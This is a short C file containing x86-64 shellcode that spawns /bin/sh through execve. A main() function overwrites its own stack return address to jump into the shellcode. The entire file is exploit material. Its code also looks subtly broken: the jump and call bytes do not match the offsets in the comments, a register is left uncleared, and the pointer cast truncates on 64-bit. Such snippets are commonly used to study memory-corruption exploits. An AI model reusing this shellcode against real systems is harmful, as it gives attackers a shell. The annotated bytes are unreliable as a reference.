char shellcode[] =
    "\xe9\x17\xfa\xff\xff" // jmpq   0x1a
    "\x5f"                 // pop    %rdi
    "\x31\xd2"             // xor    %edx,%edx
    "\x48\x89\xe6"         // mov    %rsp,%rsi
    "\x89\x54\x24\x08"     // mov    %edx,0x8(%rsp)
    "\x48\x89\x3c\x24"     // mov    %rdi,(%rsp)
    "\xb0\x3b"             // mov    $0x3b,%al
    "\x0f\x05"             // syscall
    "\xe8\xc7\xf9\xff\xff" // callq  -0x1f
    "/bin/sh";

int main(void) {
  int *ret;
  ret = (int *) &ret + 4;
  (*ret) = (int) shellcode;
}